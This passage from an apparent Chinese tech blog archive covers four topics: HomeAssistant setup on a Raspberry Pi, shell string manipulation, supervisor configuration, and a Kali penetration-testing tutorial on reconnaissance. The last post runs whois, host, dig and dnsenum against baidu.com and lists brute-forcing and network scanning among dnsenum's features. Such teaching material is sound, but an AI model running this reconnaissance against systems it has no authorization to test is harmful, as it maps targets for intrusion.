<p>HomeAssistant 是国外一个成熟的，开源的智能家居平台，这个平台的目的是把所有能通过 Wifi 控制的电器全部接入进来统一管理，这样你可以在手机、电脑上随时随地了解家里的情况并做出控制。</p>
<p><img src="/articles/ece79d2c/1.png" alt="img"></p>
<p><img src="/articles/ece79d2c/2.png" alt="img"></p>
<p>而好消息是， echo 也已经被黑客黑客攻克并且集成到了这里面，原理其实是把 HomeAssistant 上已经接入的设备伪装成 echo 能够识别的 Hue Bridge, 从而达到让 echo 控制普通电器的目的。</p>
<a id="more"></a>

<h2 id="HomeAssistant"><a href="#HomeAssistant" class="headerlink" title="HomeAssistant"></a>HomeAssistant</h2><p>介绍了那么多，我们让 HomeAssistant 先 run 起来吧。</p>
<p>我们完全可以在自己的电脑上运行　HomeAssistant 这个服务，但是考虑到这个这个服务需要像路由器一样24小时运行，对于这样的需求最理想的方案是把服务分出去到一个单独的硬件上运行，就像路由器一样，因此，体积小巧却五脏俱全的树莓派理所当然成了首选。</p>
<p>说到树莓派，它其实就是一台完整的计算机。连上显示器它就是一台电脑，通过 ssh 就是一台服务器，通过 smb 就是一台 NAS。下面我简单介绍一下当你买到一台树莓派之后你通常应该做什么。</p>
<h4 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a><strong>安装系统</strong></h4><p>推荐购买集成 WIFI 模块的树莓派 3B+。然后你需要一张被格式化成 <code>FAT</code> 格式且大于等于8G的 SD 卡。</p>
<p><img src="/articles/ece79d2c/3.png" alt="img"></p>
<p>HomeAssistant 真是个成熟的社区，他们甚至直接提供了内置 HomeAssistant 服务的 Raspbian 系统 —— <a href="https://home-assistant.io/docs/hassbian/installation/" target="_blank" rel="noopener">Hassbian</a> 。点击下载最新版本固件。</p>
<p>然后使用 <a href="https://etcher.io/" target="_blank" rel="noopener">Etcher</a> 把下载好的系统刷入 SD 卡。</p>
<p><img src="/articles/ece79d2c/4.png" alt="img"></p>
<h4 id="ssh-连接树莓派"><a href="#ssh-连接树莓派" class="headerlink" title="ssh 连接树莓派"></a><strong>ssh 连接树莓派</strong></h4><p>将 SD 卡插入树莓派，通电。如果你是第一次使用树莓派或者你换了张新卡，首先需要先将树莓派连上网线，然后前往路由器的 DHCP 找到树莓派的 IP 地址。</p>
<p><img src="/articles/ece79d2c/5.png" alt="img"></p>
<p>由于是动态分配的 IP，每隔一定时间 IP 就会自动分配不利于后续的使用，所以你需要给树莓派分配一个静态地址，比如我下面给树莓派分配了 <code>192.168.10.222</code>。重新连接网线既可更新。</p>
<p><img src="/articles/ece79d2c/6.png" alt="img"></p>
<p>然后你就可以用 ssh 连接你的树莓派了。下一步我们要让树莓派自动连接 WIFI，这样就可以彻底告别网线了。打开终端或者 <a href="http://www.iterm2.com/version3.html" target="_blank" rel="noopener">iTerm</a>，输入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh pi@192.168.10.222</span><br></pre></td></tr></table></figure>

<p>Hassbian 默认用户名 <code>pi</code> ,默认密码 <code>raspberry</code>。成功连上：</p>
<p><img src="/articles/ece79d2c/7.png" alt="img">连上之后通过 <code>passwd</code> 命令修改默认密码。</p>
<h4 id="自动连接-WIFI"><a href="#自动连接-WIFI" class="headerlink" title="自动连接 WIFI"></a><strong>自动连接 WIFI</strong></h4><p>下面我们要让树莓派每次启动都可以自己连上 WIFI，就像我们平时使用的数码产品一样。回到命令行，输入：</p>
<p>　</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo iwlist wlan0 scan</span><br></pre></td></tr></table></figure>

<p>`</p>
<p>以上命令可以找到所有可用网络，每一个 cell 表示一个可用网络。</p>
<p><img src="/articles/ece79d2c/8.png" alt="img">通过 <code>ESSID:</code> 找到你要连接网络，记下名称，用 nano 工具配置 wifi 信息：</p>
<p>　　<code>sudo nano /etc/wpa_supplicant/wpa_supplicant.conf</code></p>
<p>在最下方填上 WIFI 信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">network=&#123;  </span><br><span class="line">    ssid=<span class="string">"XXXX"</span>  </span><br><span class="line">    psk=<span class="string">"XXXX"</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/articles/ece79d2c/9.png" alt="img"></p>
<p><code>control+o</code> <code>回车</code> <code>control+x</code>保存并退出编辑器。</p>
<p>重启树莓派</p>
<p><code>sudo reboot</code></p>
<p>至此，你可以拔掉你的网线了，你的树莓派已经可以自动连上WIFI。</p>
<h4 id="域名解析＋ssh-免密码登录"><a href="#域名解析＋ssh-免密码登录" class="headerlink" title="域名解析＋ssh 免密码登录"></a><strong>域名解析＋ssh 免密码登录</strong></h4><p>其实树莓派就是一台服务器，如果你自己买过服务器或者搭过网站的话一定会做的两件事就是 <code>域名解析</code> 和 <code>ssh 免密码登录</code>，前者可以让你用一个好记的域名而不是每次都输入一串 IP 地址并可以在外网访问到树莓派，后者为了每次 ssh 不用重复输密码。</p>
<p>首先你要知道自己的路由器的公网 IP，你可以分别前往路由器管理界面查看自己 WAN 口分配的 IP 和 <a href="http://ip.cn/" target="_blank" rel="noopener">ip.cn</a> 查到的公网 IP 是否一致，一致的话说明你用的就是公网 IP，这个 IP 可以直接用来做解析，不一致的话你就需要动态域名解析了，你需要在树莓派上跑个脚本隔一段时间把公网 IP 更新到域名解析的地方。由于我是公网 IP，我就不演示动态域名解析的例子了，你可以在网上找到很多文章。<a href="https://zhuanlan.zhihu.com/p/21501138" target="_blank" rel="noopener">[1]</a> <a href="https://migege.com/post/python-dnspod-for-raspberry-pi" target="_blank" rel="noopener">[2]</a></p>
<p>如果你已经有域名了，就可以去域名服务商 DNS 管理界面添加一条 A 记录，指向你的公网 IP。一般过半个小时域名就可以生效。如果你没有自己的域名，也有很多免费的域名提供商，比如 <a href="http://www.kittenyang.com/homeassistant_practice_01/duckdns" target="_blank" rel="noopener">duckdns</a>。域名配置好了，你还需要做最后一步，端口转发。</p>
<p>你从外网 ssh 访问路由器公网 IP 的 22 端口，如果不做端口转发，那么这个请求就无人认领而导致 time out，所以前往路由器管理界面，我刷的是 OpenWrt 的固件，在防火墙-端口转发里设置，这个功能绝大多数路由器都有，只不过名字不同而已，你仔细找找。</p>
<p><img src="/articles/ece79d2c/10.png" alt="img"></p>
<p>域名也解析好了，端口也转发好了，那么你就可以愉快地在世界任何一个地方通过 <code>ssh pi@sub.domain.com</code> 连接你的树莓派了。</p>
<p>ssh 免密登录也很简单，就是把 Mac 本地的公钥传到树莓派上。首先查看本地 Mac 上的公钥</p>
<p><code>ls ~/.ssh</code></p>
<p>如果存在 <code>id_rsa.pub</code> 或 <code>id_dsa.pub</code> ,直接</p>
<p><code>cat ~/.ssh/id_rsa.pub | ssh pi@192.168.x.x &#39;cat &gt;&gt; .ssh/authorized_keys&#39;</code>　</p>
<p>把公钥传到树莓派上就可以了。如果之前没有生成过秘钥对，那就生成一对：</p>
<p><code>ssh-keygen -t rsa -C &lt;YourName&gt;@pi</code></p>
<p>然后重复上面的　cat &gt;&gt;　命令即可。</p>
<h4 id="通过-SFTP-浏览系统文件"><a href="#通过-SFTP-浏览系统文件" class="headerlink" title="通过 SFTP 浏览系统文件"></a><strong>通过 SFTP 浏览系统文件</strong></h4><p>涉及到浏览文件的操作，我推荐使用 FTP 的软件，原因就是直观，我使用的是 <a href="https://www.panic.com/transmit/" target="_blank" rel="noopener">Transmit</a>，你也可以使用其他免费的 FTP 软件。</p>
<p><img src="/articles/ece79d2c/11.png" alt="img"></p>
<p>你会发现 Hassbian 已经内置了 HomeAssistant 服务，相关文件都在 <code>/home/homeassistant/.homeassistant</code> 里，如果你看不到 .homeassistant 文件夹，需要手动开启显示隐藏文件。</p>
<p><img src="/articles/ece79d2c/12.png" alt="img"></p>
<p>如果还是没看到 .homeassistant，再等等，一般 Hassbian 需要 5-10 分钟下载 HomeAssistant 的相关服务，如果你不走运可能下到了假的 Hassbian,你可以手动更新 HomeAssistant。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo systemctl stop home-assistant@homeassistant.service</span><br><span class="line">$ sudo su -s /bin/bash homeassistant</span><br><span class="line">$ <span class="built_in">source</span> /srv/homeassistant/bin/activate</span><br><span class="line">$ pip3 install --upgrade homeassistant</span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">$ sudo systemctl start home-assistant@homeassistant.service</span><br></pre></td></tr></table></figure>

<p>如果出现了 <code>.homeassistant</code> 隐藏文件夹，那么你可以在浏览器输入 <code>192.168.x.x:8123</code>(192.168.x.x 是你树莓派的 IP)，你应该能看到 HomeAssistant 的控制界面了。这里有一条默认的规定是 HomeAssistant 默认是开在 8123 端口上的。</p>
<p><img src="/articles/ece79d2c/13.png" alt="img"></p>
<p>TA-DA! 这说明你的 HomeAssistant 服务已经开启。</p>
<p>和上面一样，如果你想在外网访问这个页面，只需要在路由器的端口转发设置页面再设置一条外网 8123 转树莓派 8123 的转发规则即可，这样你就可以在世界任何一个角落通过 <code>sub.domain.com:8123</code> 访问树莓派上的 HomeAssistant 服务了。</p>
<p>接下来的文章我将详细介绍 HomeAssistant 的使用。</p>
]]></content>
      <categories>
        <category>智能工程</category>
      </categories>
      <tags>
        <tag>Ai</tag>
      </tags>
  </entry>
  <entry>
    <title>shell替换和截取字符串详解</title>
    <url>/articles/150d8700.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>本文详细介绍了shell中替换和截取字符串等其他的妙用。</p>
<a id="more"></a>

<h2 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">例子：file=/dir1/dir2/dir3/my.file.txt</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;file<span class="comment">#*/&#125;:       拿掉第一条/及其左边的字符串：dir1/dir2/dir3/my.file.txt</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;file<span class="comment">##*/&#125;:    拿掉最后一条/及其左边的字符串：my.file.txt</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;file<span class="comment">#*.&#125;:       拿掉第一个.及其左边的字符串：file.txt</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;file<span class="comment">##*.&#125;:    拿掉最后一个.及其左边的字符串：txt</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;file%/*&#125;:     拿掉最后条/及其右边的字符串：/dir1/dir2/dir3</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;file%%/*&#125;: 拿掉第一条/及其右边的字符串：(空值)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;file%.*&#125;:    拿掉最后一个.及其右边的字符串：/dir1/dir2/dir3/my.file</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;file%%.*&#125;: 拿掉第一个.及其右边的字符串：/dir1/dir2/dir3/my</span></span><br></pre></td></tr></table></figure>

<p>记忆的方法为：<br>#是去掉左边, ##最后一个<br>%是去掉右边, %%第一个</p>
<h2 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h2><p>单一符号是最小匹配﹔两个符号是最大匹配。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;file:0:5&#125;：提取最左边的 5 个字节：/dir1</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;file:5:5&#125;：提取第 5 个字节右边的连续 5 个字节：/dir2</span></span><br></pre></td></tr></table></figure>

<h2 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;file/dir/path&#125;：将第一个 dir 提换为 path：/path1/dir2/dir3/my.file.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;file//dir/path&#125;：将全部 dir 提换为 path：/path1/path2/path3/my.file.txt</span></span><br></pre></td></tr></table></figure>

<h2 id="针对不同的变量状态赋值-没设定、空值、非空值-："><a href="#针对不同的变量状态赋值-没设定、空值、非空值-：" class="headerlink" title="针对不同的变量状态赋值(没设定、空值、非空值)："></a>针对不同的变量状态赋值(没设定、空值、非空值)：</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;file-my.file.txt&#125;: 若<span class="variable">$file</span>没有设定，则使用my.file.txt作返回值。(空值及非空值时不作处理)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;file:-my.file.txt&#125;:若<span class="variable">$file</span>没有设定或为空值，则使用my.file.txt作返回值。(非空值时不作处理)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;file+my.file.txt&#125;: 若<span class="variable">$file</span>设为空值或非空值，均使用my.file.txt作返回值。(没设定时不作处理)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;file:+my.file.txt&#125;:若<span class="variable">$file</span>为非空值，则使用my.file.txt作返回值。(没设定及空值时不作处理)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;file=my.file.txt&#125;: 若<span class="variable">$file</span>没设定，则使用my.file.txt作返回值，同时将<span class="variable">$file</span> 赋值为 my.file.txt。(空值及非空值时不作处理)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;file:=my.file.txt&#125;:若<span class="variable">$file</span>没设定或为空值，则使用my.file.txt作返回值，同时将 <span class="variable">$file</span> 赋值为 my.file.txt。(非空值时不作处理)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;file?my.file.txt&#125;: 若<span class="variable">$file</span>没设定，则将my.file.txt输出至 STDERR。(空值及非空值时不作处理)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;file:?my.file.txt&#125;:若<span class="variable">$file</span>没设定或为空值，则将my.file.txt输出至STDERR。(非空值时不作处理)</span></span><br><span class="line"></span><br><span class="line">注意: </span><br><span class="line">":+"的情况是不包含空值的.</span><br><span class="line">":-", ":="等只要有号就是包含空值(null).</span><br></pre></td></tr></table></figure>

<h2 id="变量的长度"><a href="#变量的长度" class="headerlink" title="变量的长度"></a>变量的长度</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#file&#125;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="数组运算"><a href="#数组运算" class="headerlink" title="数组运算"></a>数组运算</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">A=(a b c def)</span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;A[@]&#125; 或 <span class="variable">$&#123;A[*]&#125;</span> 可得到 a b c def (全部组数)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;A[0]&#125; 可得到 a (第一个组数)，<span class="variable">$&#123;A[1]&#125;</span> 则为第二个组数...</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#A[@]&#125; 或 $&#123;#A[*]&#125; 可得到 4 (全部组数数量)</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;<span class="comment">#A[0]&#125; 可得到 1 (即第一个组数(a)的长度)，$&#123;#A[3]&#125; 可得到 3 (第四个组数(def)的长度)</span></span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>编程积累</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title>supervisor使用详解</title>
    <url>/articles/f13b8f05.html</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>supervisor是用Python开发的一个client/server服务，是Linux/Unix系统下的一个进程管理工具。可以很方便的监听、启动、停止、重启一个或多个进程。用supervisor管理的进程，当一个进程意外被杀死，supervisor监听到进程死后，会自动将它重启，很方便的做到进程自动恢复的功能，不再需要自己写shell脚本来控制。</p>
<a id="more"></a>



<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>配置好yum源后，可以直接安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install supervisor</span><br></pre></td></tr></table></figure>

<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>安装好后在/etc/会生成一个supervisord.conf文件及一个supervisord.d文件目录</p>
<p>supervisord.conf是一些默认配置，可自行修改：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[unix_http_server]</span><br><span class="line"></span><br><span class="line">file=/tmp/supervisor.sock ;UNIX socket 文件，supervisorctl 会使用</span><br><span class="line"></span><br><span class="line">;chmod=0700 ;socket文件的mode，默认是0700</span><br><span class="line"></span><br><span class="line">;chown=nobody:nogroup ;socket文件的owner，格式：uid:gid</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">;[inet_http_server] ;HTTP服务器，提供web管理界面</span><br><span class="line"></span><br><span class="line">;port=127.0.0.1:9001 ;Web管理后台运行的IP和端口，如果开放到公网，需要注意安全性</span><br><span class="line"></span><br><span class="line">;username=user ;登录管理后台的用户名</span><br><span class="line"></span><br><span class="line">;password=123 ;登录管理后台的密码</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">[supervisord]</span><br><span class="line"></span><br><span class="line">logfile=/tmp/supervisord.log ;日志文件，默认是 $CWD/supervisord.log</span><br><span class="line"></span><br><span class="line">logfile_maxbytes=50MB ;日志文件大小，超出会rotate，默认 50MB，如果设成0，表示不限制大小</span><br><span class="line"></span><br><span class="line">logfile_backups=10 ;日志文件保留备份数量默认10，设为0表示不备份</span><br><span class="line"></span><br><span class="line">loglevel=info ;日志级别，默认info，其它: debug,warn,trace</span><br><span class="line"></span><br><span class="line">pidfile=/tmp/supervisord.pid ;pid 文件</span><br><span class="line"></span><br><span class="line">nodaemon=false ;是否在前台启动，默认是false，即以 daemon 的方式启动</span><br><span class="line"></span><br><span class="line">minfds=1024 ;可以打开的文件描述符的最小值，默认 1024</span><br><span class="line"></span><br><span class="line">minprocs=200 ;可以打开的进程数的最小值，默认 200</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">[supervisorctl]</span><br><span class="line"></span><br><span class="line">serverurl=unix:///tmp/supervisor.sock ;通过UNIX socket连接supervisord，路径与unix_http_server部分的file一致</span><br><span class="line"></span><br><span class="line">;serverurl=http://127.0.0.1:9001 ; 通过HTTP的方式连接supervisord</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">; [program:xx]是被管理的进程配置参数，xx是进程的名称</span><br><span class="line"></span><br><span class="line">[program:xx]</span><br><span class="line"></span><br><span class="line">command=/opt/apache-tomcat-8.0.35/bin/catalina.sh run ; 程序启动命令</span><br><span class="line"></span><br><span class="line">autostart=true ; 在supervisord启动的时候也自动启动</span><br><span class="line"></span><br><span class="line">startsecs=10 ; 启动10秒后没有异常退出，就表示进程正常启动了，默认为1秒</span><br><span class="line"></span><br><span class="line">autorestart=true ; 程序退出后自动重启,可选值：[unexpected,true,false]，默认为unexpected，表示进程意外杀死后才重启</span><br><span class="line"></span><br><span class="line">startretries=3 ; 启动失败自动重试次数，默认是3</span><br><span class="line"></span><br><span class="line">user=tomcat ; 用哪个用户启动进程，默认是root</span><br><span class="line"></span><br><span class="line">priority=999 ; 进程启动优先级，默认999，值小的优先启动</span><br><span class="line"></span><br><span class="line">redirect_stderr=true ; 把stderr重定向到stdout，默认false</span><br><span class="line"></span><br><span class="line">stdout_logfile_maxbytes=20MB ; stdout 日志文件大小，默认50MB</span><br><span class="line"></span><br><span class="line">stdout_logfile_backups = 20 ; stdout 日志文件备份数，默认是10</span><br><span class="line"></span><br><span class="line">; stdout 日志文件，需要注意当指定目录不存在时无法正常启动，所以需要手动创建目录（supervisord 会自动创建日志文件）</span><br><span class="line"></span><br><span class="line">stdout_logfile=/opt/apache-tomcat-8.0.35/logs/catalina.out</span><br><span class="line"></span><br><span class="line">stopasgroup=false ;默认为false,进程被杀死时，是否向这个进程组发送stop信号，包括子进程</span><br><span class="line"></span><br><span class="line">killasgroup=false ;默认为false，向进程组发送kill信号，包括子进程</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">;包含其它配置文件</span><br><span class="line"></span><br><span class="line">[include]</span><br><span class="line"></span><br><span class="line">files = relative/directory/*.ini ;可以指定一个或多个以.ini结束的配置文件</span><br></pre></td></tr></table></figure>

<p>注意：[include]默认配置是制定<em>.ini，因个人习惯命名为</em>.conf文件，因此修改配置如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[include]</span><br><span class="line">files = relative/directory/*.conf</span><br></pre></td></tr></table></figure>

<p>supervisord.d目录用来存放用户自定义的进程配置，参考：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[program:es]</span><br><span class="line"></span><br><span class="line">command=/opt/software/elasticsearch/bin/elasticsearch</span><br><span class="line"></span><br><span class="line">user=es</span><br><span class="line"></span><br><span class="line">stdout_logfile=/opt/supervisor_test/run.log</span><br><span class="line"></span><br><span class="line">autostart=true</span><br><span class="line"></span><br><span class="line">autorestart=true</span><br><span class="line"></span><br><span class="line">startsecs=60</span><br><span class="line"></span><br><span class="line">stopasgroup=true</span><br><span class="line"></span><br><span class="line">ikillasgroup=true</span><br><span class="line"></span><br><span class="line">startretries=1</span><br><span class="line"></span><br><span class="line">redirect_stderr=true</span><br></pre></td></tr></table></figure>

<p>注意: supervisor不能监控后台进程，command 不能为后台运行命令</p>
<p>服务段启动</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">supervisord -c /etc/supervisord.conf</span><br></pre></td></tr></table></figure>

<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>supervisorctl 是 supervisord的命令行客户端工具</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">supervisorctl status：查看所有进程的状态</span><br><span class="line"></span><br><span class="line">supervisorctl stop es：停止es</span><br><span class="line"></span><br><span class="line">supervisorctl start es：启动es</span><br><span class="line"></span><br><span class="line">supervisorctl restart es: 重启es</span><br><span class="line"></span><br><span class="line">supervisorctl update ：配置文件修改后可以使用该命令加载新的配置</span><br><span class="line"></span><br><span class="line">supervisorctl reload: 重新启动配置中的所有程序</span><br><span class="line"></span><br><span class="line">把es 换成all 可以管理配置中的所有进程</span><br><span class="line"></span><br><span class="line">直接输入：supervisorctl 进入supervisorctl 的shell交互界面，上面的命令不带supervisorctl 可直接使用</span><br></pre></td></tr></table></figure>

<p>直接输入：supervisorctl 进入supervisorctl 的shell交互界面，上面的命令不带supervisorctl 可直接使用</p>
<p><img src="/articles/f13b8f05/1.png" alt="img"></p>
<h2 id="踩过的坑"><a href="#踩过的坑" class="headerlink" title="踩过的坑"></a>踩过的坑</h2><p>1、unix:///var/run/supervisor/supervisor.sock no such file</p>
<p>​     问题描述：安装好supervisor没有开启服务直接使用supervisorctl报的错</p>
<p>​     解决办法：supervisord -c /etc/supervisord.conf </p>
<p>2、command中指定的进程已经起来，但supervisor还不断重启</p>
<p>​     问题描述：command中启动方式为后台启动，导致识别不到pid，然后不断重启，本人使用的是elasticsearch，command                        指定的是$path/bin/elasticsearch -d，踩到的坑</p>
<p>​     解决办法：supervisor无法检测后台启动进程的pid，而supervisor本身就是后台启动守护进程，因此不用担心这个</p>
<p>3、启动了多个supervisord服务，导致无法正常关闭服务</p>
<p>​    问题描述：在运行supervisord -c /etc/supervisord.conf 之前，我直接运行过supervisord -c /etc/supervisord.d/xx.conf                         ，导致有些进程被多个superviord管理，无法正常关闭进程。</p>
<p>​    解决办法： 使用 ps -fe | grep supervisord 查看所有启动过的supervisord服务，kill相关的进程。</p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Supervisor</tag>
      </tags>
  </entry>
  <entry>
    <title>kali之信息收集</title>
    <url>/articles/1c43ef2c.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p><strong>在本文中，我们将讨论渗透测试中第二个阶段——信息收集。我们会介绍Kali中一系列的信息收集工具。在阅读本文之后，我们希望你能对信息收集有更好的理解。</strong></p>
<p>在这个阶段我们需要尽可能多的收集目标的信息，例如：域名的信息，DNS，IP，使用的技术和配置，文件，联系方式等等。在信息收集中，每一个信息都是重要的。</p>
<a id="more"></a>

<h2 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h2><p><strong>信息收集的方式可以分为两种：主动和被动。主动的信息收集方式：通过直接访问、扫描网站，这种将流量流经网站的行为。被动的信息收集方式：利用第三方的服务对目标进行访问了解，比例：Google搜索。</strong></p>
<p><strong>注意：</strong></p>
<p>没有一种方式是最完美的，每个方式都有自己的优势，主动方式，你能获取更多的信息，但是目标主机可能会记录你的操作记录。被动方式，你收集的信息会先对少，但是你的行动并不会被目标主机发现。一般在一个渗透项目下，你需要有多次的信息收集，同时也要运用不同的收集方式，才能保证信息收集的完整性。</p>
<p>在这章，我们将介绍主动和被动的信息收集方式，来收集一个目标的信息。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h4 id="使用公共资源"><a href="#使用公共资源" class="headerlink" title="使用公共资源"></a><strong>使用公共资源</strong></h4><p>在互联网中，有几个公开的资源网站可以用来对目标信息进行收集，使用这些网站，流量并不会流经目标主机，所以目标主机也不会记录你的行为。</p>
<h4 id="域名注册信息"><a href="#域名注册信息" class="headerlink" title="域名注册信息"></a><strong>域名注册信息</strong></h4><p>当你知道目标的域名，你首先要做的就是通过Whoist数据库查询域名的注册信息，Whois数据库是提供域名的注册人信息，包括联系方式，管理员名字，管理员邮箱等等，其中也包括DNS服务器的信息。</p>
<p>关于Whois的介绍请访问：<a href="https://www.ietf.org/rfc/rfc3912.txt" target="_blank" rel="noopener">https://www.ietf.org/rfc/rfc3912.txt‍</a></p>
<p>默认情况下，Kali已经安装了Whois。你只需要输入要查询的域名即可：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#whois baidu.com</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1c43ef2c/1.png" alt></p>
<p>(部分)</p>
<p>我们可以获取关于百度的DNS服务器信息，域名注册基本信息。这些信息在以后的测试阶段中有可能会发挥重大的作用。</p>
<p>除了使用whois命令，也有一些网站提供在线whois信息查询：</p>
<p><strong>whois</strong>.chinaz.com/</p>
<p><a href="http://www.internic.net/whois.html" target="_blank" rel="noopener">www.internic.net/whois.html</a></p>
<p>收集完域名信息之后，我们将开始收集关于DNS服务器的详细信息。</p>
<h4 id="DNS分析"><a href="#DNS分析" class="headerlink" title="DNS分析"></a><strong>DNS分析</strong></h4><p>使用DNS分析工具的目的在于收集有关DNS服务器和测试目标的相应记录信息。</p>
<p>以下是几种常见的DNS记录类型：</p>
<p><img src="/articles/1c43ef2c/2.png" alt></p>
<p>例如，在一个测试项目中，客户只给了一个域名，需要你用着域名，来查找所有目标主机的IP和可用的域。接下来我们将带你实现这样的功能。</p>
<h4 id="host"><a href="#host" class="headerlink" title="host"></a><strong>host</strong></h4><p>在获取DNS服务器信息之后，下一步就是借助DNS服务器找出目标主机IP地址。我们可以使用下面的命令行工具来借助一个DNS服务器查找目标主机的IP地址：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># host www.baidu.com</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1c43ef2c/3.png" alt></p>
<p>我们可以看到 有两个IP地址？？</p>
<p>一般情况下，host查找的是A，AAAA，和MX的记录。</p>
<p>查询详细的记录只需要添加 -a</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#host -a baidu.com 8.8.8.8</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1c43ef2c/4.png" alt></p>
<p>这里8.8.8.8是指定一个DNS服务器。</p>
<p>因为 host命令查找记录是通过Kali的DNS服务器系统文件，该文件位于/etc/resolv.conf.你可以往里面添加DNS任意服务器。当然也可以像我一样直接在命令行中指定DNS服务器。</p>
<h4 id="dig"><a href="#dig" class="headerlink" title="dig"></a><strong>dig</strong></h4><p>除了host命令，你也可以使用dig命令对DNS服务器进行挖掘。相对于host命令，dig命令更具有灵活和清晰的显示信息。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#dig baidu.com</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1c43ef2c/5.png" alt></p>
<p>不使用选项的dig命令，只返回一个记录。如果要返回全部的记录，只需要在命令添加给出的类型：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#dig baidu.com any</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1c43ef2c/6.png" alt></p>
<h4 id="dnsenum"><a href="#dnsenum" class="headerlink" title="dnsenum"></a><strong>dnsenum</strong></h4><p>我们可以利用dnsenum从DNS服务器上获取以下信息：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. 主机IP地址</span><br><span class="line">2. 该域名的DNS服务器</span><br><span class="line">3. 该域名的MX记录</span><br></pre></td></tr></table></figure>

<p>除了被用来获取DNS信息，dnsenum还具有以下特点：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. 使用谷歌浏览器获取子域名</span><br><span class="line">2. 暴力破解</span><br><span class="line">3. C级网络扫描</span><br><span class="line">4. 反向查找网络</span><br></pre></td></tr></table></figure>

<p>启动dnsenum，使用如下命令</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#dnsenum</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1c43ef2c/7.png" alt></p>
<p>通过一个例子来演示：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># dnsnum baidu.com</span><br></pre></td></tr></table></figure>

<p><img src="/articles/1c43ef2c/8.png" alt></p>
